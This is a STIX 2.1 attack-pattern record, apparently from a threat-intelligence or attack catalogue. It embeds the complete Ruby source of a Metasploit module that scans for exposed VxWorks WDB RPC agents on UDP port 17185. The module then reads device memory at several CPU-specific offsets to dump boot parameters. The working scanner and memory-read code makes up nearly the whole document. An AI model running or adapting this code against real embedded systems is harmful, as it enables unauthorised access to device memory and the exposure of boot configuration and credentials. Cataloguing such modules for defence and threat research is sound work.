{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e962df04-244e-477c-83ea-5eed4e855924",
    "created": "2024-08-14T16:27:01.297333Z",
    "modified": "2024-08-14T16:27:01.297337Z",
    "name": "VxWorks WDB Agent Boot Parameter Scanner",
    "description": "Scan for exposed VxWorks wdbrpc daemons and dump the boot parameters from memory",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/vxworks/wdbrpc_bootline.rb",
            "external_id": "wdbrpc_bootline.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.metasploit.com/2010/08/vxworks-vulnerabilities.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::WDBRPC\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'VxWorks WDB Agent Boot Parameter Scanner',\n      'Description' => 'Scan for exposed VxWorks wdbrpc daemons and dump the boot parameters from memory',\n      'Author'      => 'hdm',\n      'License'     => MSF_LICENSE,\n      'References'     =>\n        [\n          ['URL', 'http://blog.metasploit.com/2010/08/vxworks-vulnerabilities.html'],\n          ['US-CERT-VU', '362332']\n        ]\n    )\n\n    register_options(\n    [\n      OptInt.new('BATCHSIZE', [true, 'The number of hosts to probe in each set', 256]),\n      Opt::RPORT(17185)\n    ])\n  end\n\n\n  # Define our batch size\n  def run_batch_size\n    datastore['BATCHSIZE'].to_i\n  end\n\n  # Operate on an entire batch of hosts at once\n  def run_batch(batch)\n\n    begin\n      udp_sock = nil\n      idx = 0\n\n      udp_sock = Rex::Socket::Udp.create(\n        {\n          'Context' => {'Msf' => framework, 'MsfExploit' => self}\n        }\n      )\n      add_socket(udp_sock)\n\n      @udp_sock = udp_sock\n\n      batch.each do |ip|\n\n        begin\n          udp_sock.sendto(create_probe(ip), ip, datastore['RPORT'].to_i, 0)\n        rescue ::Interrupt\n          raise $!\n        rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused\n          nil\n        end\n\n        if (idx % 10 == 0)\n          while (r = udp_sock.recvfrom(65535, 0.01) and r[1])\n            parse_reply(r)\n          end\n        end\n\n        idx += 1\n      end\n\n      cnt = 0\n      del = 10\n      sts = Time.now.to_i\n      while (r = udp_sock.recvfrom(65535, del) and r[1])\n        parse_reply(r)\n\n        # Prevent an indefinite loop if the targets keep replying\n        cnt += 1\n        break if cnt > run_batch_size\n\n        # Escape after 15 seconds regardless of batch size\n        break if ((sts + 15) < Time.now.to_i)\n\n        del = 1.0\n      end\n\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_status(\"Unknown error: #{e.class} #{e}\")\n    ensure\n      udp_sock.close if udp_sock\n    end\n  end\n\n  #\n  # The response parsers\n  #\n  def parse_reply(pkt)\n\n    return if not pkt[1]\n\n    if(pkt[1] =~ /^::ffff:/)\n      pkt[1] = pkt[1].sub(/^::ffff:/, '')\n    end\n\n    data = pkt[0]\n\n    # Bare RPC response\n    if data.length == 24\n      ecode = data[20,4].unpack(\"N\")[0]\n      emesg = \"unknown\"\n      case ecode\n      when 3\n        # Should not be hit\n        emesg = \"Device requires the VxWorks 5 WDB protocol\"\n      when 5\n        emesg = \"Device failed to parse the probe\"\n      end\n\n      print_status(\"#{pkt[1]} Error: code=#{ecode} #{emesg}\")\n      return\n    end\n\n    if data.length < 80\n      print_status(\"#{pkt[1]}: Unknown response #{data.unpack(\"H*\")[0]}\")\n      return\n    end\n\n    # Memory dump response\n    if data[48,64] =~ /^.{1,16}\\(\\d+,\\d+\\)/\n      buff = data[48, data.length-48]\n      boot,left = buff.split(\"\\x00\", 2)\n      print_good(\"#{pkt[1]}: BOOT> #{boot}\")\n      report_note(\n        :host   => pkt[1],\n        :port   => datastore['RPORT'],\n        :proto  => 'udp',\n        :type   => 'vxworks.bootline',\n        :data   => {:bootline => boot },\n        :update => :unique_data\n      )\n      return\n    end\n\n    res = wdbrpc_parse_connect_reply(data)\n\n    if res[:rt_membase]\n      print_good(\"#{pkt[1]}: #{res[:rt_vers]} #{res[:rt_bsp_name]} #{res[:rt_bootline]}\")\n\n      report_note(\n        :host   => pkt[1],\n        :port   => datastore['RPORT'],\n        :proto  => 'udp',\n        :type   => 'vxworks.target_info',\n        :data   => res,\n        :update => :unique\n      )\n\n      # Send the memory dump request for the bootline. Theoretically we can infer the correct\n      # location from the cpu type and BSP name, but these are tough to categorize and there\n      # is no harm in trying multiple offsets\n\n      # Most common mapping is 0x700 (M68k, ARM, etc)\n      @udp_sock.sendto(wdbrpc_request_memread(res[:rt_membase] + 0x700, 512), pkt[1], datastore['RPORT'].to_i, 0)\n\n      # PowerPC uses 0x4200\n      @udp_sock.sendto(wdbrpc_request_memread(res[:rt_membase] + 0x4200, 512), pkt[1], datastore['RPORT'].to_i, 0)\n\n      # PC x86 uses 0x1200\n      @udp_sock.sendto(wdbrpc_request_memread(res[:rt_membase] + 0x1200, 512), pkt[1], datastore['RPORT'].to_i, 0)\n\n      # SPARC-lite uses 0x600\n      @udp_sock.sendto(wdbrpc_request_memread(res[:rt_membase] + 0x600, 512), pkt[1], datastore['RPORT'].to_i, 0)\n    end\n  end\n\n\n  def create_probe(ip)\n    wdbrpc_request_connect(ip)\n  end\nend\n"
}